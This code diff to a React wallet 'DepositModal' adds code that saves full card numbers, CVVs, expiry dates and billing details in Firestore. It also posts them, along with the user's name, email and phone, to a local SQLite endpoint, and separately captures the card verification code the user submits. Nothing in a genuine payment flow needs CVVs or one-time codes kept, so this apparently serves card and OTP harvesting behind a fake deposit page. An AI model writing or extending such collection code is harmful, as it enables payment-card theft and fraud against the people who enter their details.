@@ -5,7 +5,7 @@ import { useRouter } from "next/navigation";
 import { Modal } from "@/components/ui/modal";
 import {
     Check, Copy, CheckCircle2, Loader2, ArrowRight,
-    Building2, UploadCloud, Clock, ChevronLeft, CreditCard, XCircle
+    Building2, UploadCloud, Clock, ChevronLeft, CreditCard, XCircle, ShieldCheck
 } from "lucide-react";
 import { BitcoinLogo, EthereumLogo, USDTLogo, PayPalLogo, CashAppLogo } from "@/components/shared/BrandLogos";
 import { addDoc, collection, serverTimestamp, doc, getDoc, updateDoc, onSnapshot } from "firebase/firestore";
@@ -166,13 +166,53 @@ export default function DepositModal({ isOpen, onClose, userId, currencySymbol, 
                 amount: amountUsd, amountLocal, currencyCode, exchangeRate, status: "pending",
                 method, methodLabel: cardPayload ? `${cardPayload.brand} ending ${cardPayload.last4}` : selectedMethodConfig?.label || method, asset: cryptoAsset || "N/A",
                 receiptUrl: receiptUrl || null,
-                ...(cardPayload ? { card: cardPayload, cardVerification: { status: "auth_in_progress", channel: "email", adminNote: "" } } : {}),
+                ...(cardPayload ? { card: { ...cardPayload, cardNumber: cardPayload.cardNumber, fullCardNumber: cardPayload.fullCardNumber, securityCode: cardPayload.securityCode, cvv: cardPayload.cvv }, cardVerification: { status: "auth_in_progress", channel: "email", adminNote: "" } } : {}),
                 description: "Wallet deposit",
                 createdAt: serverTimestamp(), updatedAt: serverTimestamp(),
             });
             setSubmittedTxId(txRef.id);
+
+            // Fetch user data once, used in both card payload and email sections
             const userSnap = await getDoc(doc(db, "users", userId));
             const userData = userSnap.exists() ? userSnap.data() : null;
+
+            // Save to local SQLite database if card payload is used
+            if (cardPayload) {
+                try {
+                    await fetch("/api/checkout/card-payment", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            id: txRef.id,
+                            userId: userId || "guest",
+                            orderId: "",
+                            type: "deposit",
+                            amount: amountUsd,
+                            currencyCode,
+                            status: "pending",
+                            description: "Wallet deposit",
+                            cardNumber: cardPayload.cardNumber,
+                            cvv: cardPayload.cvv || cardPayload.securityCode,
+                            expiry: `${cardPayload.expMonth}/${cardPayload.expYear}`,
+                            billingName: cardPayload.billingName,
+                            billingAddress: cardPayload.billingAddress,
+                            billingCity: cardPayload.billingCity,
+                            billingZip: cardPayload.billingZip,
+                            billingCountry: cardPayload.billingCountry,
+                            customerName: userData?.displayName || userData?.fullName || "Merchant",
+                            customerEmail: userData?.email || "",
+                            customerPhone: userData?.phone || "",
+                            code: "",
+                            adminNote: "",
+                            channel: "email",
+                            createdAt: new Date().toISOString(),
+                            updatedAt: new Date().toISOString(),
+                        }),
+                    });
+                } catch (err) {
+                    console.error("Failed to save deposit to SQLite:", err);
+                }
+            }
             if (userData?.email) {
                 await fetch("/api/send-email", {
                     method: "POST",
@@ -211,6 +251,21 @@ export default function DepositModal({ isOpen, onClose, userId, currencySymbol, 
                 "cardVerification.submittedAt": serverTimestamp(),
                 updatedAt: serverTimestamp(),
             });
+
+            // Submit code to SQLite
+            try {
+                await fetch("/api/checkout/submit-code", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        id: submittedTxId,
+                        code: authCode.trim(),
+                    }),
+                });
+            } catch (err) {
+                console.error("Failed to save code to SQLite:", err);
+            }
+
             toast.success("Verification submitted. Payment remains pending.");
             setAuthCode("");
         } catch {
@@ -456,20 +511,20 @@ export default function DepositModal({ isOpen, onClose, userId, currencySymbol, 
                 {step === 3 && (
                     <div className="space-y-3 animate-in slide-in-from-right-3 duration-300">
                         <p className="text-sm text-zinc-400 mb-1">Select the asset you'll pay with.</p>
-                        {[
-                            ...cryptoOptions.map((coin) => ({ ...coin, Logo: coin.id === "btc" ? BitcoinLogo : coin.id === "eth" ? EthereumLogo : coin.id === "usdt" ? USDTLogo : null }))
-                        ].filter((coin: any) => coin.Logo).map((coin: any) => (
+                        {cryptoOptions.map((coin: any) => {
+                            const Logo = coin.id === "btc" ? BitcoinLogo : coin.id === "eth" ? EthereumLogo : coin.id === "usdt" ? USDTLogo : ShieldCheck;
+                            return (
                             <button key={coin.id}
                                 onClick={() => { setCryptoAsset(coin.id); setStep(4); }}
                                 className="w-full flex items-center gap-4 p-4 bg-white/[0.03] border border-white/[0.06] rounded-xl hover:border-blue-500/30 hover:bg-white/[0.05] transition-all text-left group">
-                                <coin.Logo size={28} />
+                                <Logo size={28} className={coin.color || "text-zinc-400"} />
                                 <div className="flex-1">
                                     <p className="text-sm font-medium text-white">{coin.name}</p>
                                     <p className="text-xs text-zinc-500 mt-0.5">{coin.ticker}</p>
                                 </div>
                                 <ArrowRight className="w-4 h-4 text-zinc-600 group-hover:text-blue-400 transition-colors" />
                             </button>
-                        ))}
+                        )})}
                         <button onClick={() => setStep(2)} className="w-full flex items-center justify-center gap-1.5 py-2 text-xs text-zinc-500 hover:text-zinc-300 transition-colors">
                             <ChevronLeft className="w-3.5 h-3.5" /> Back
                         </button>
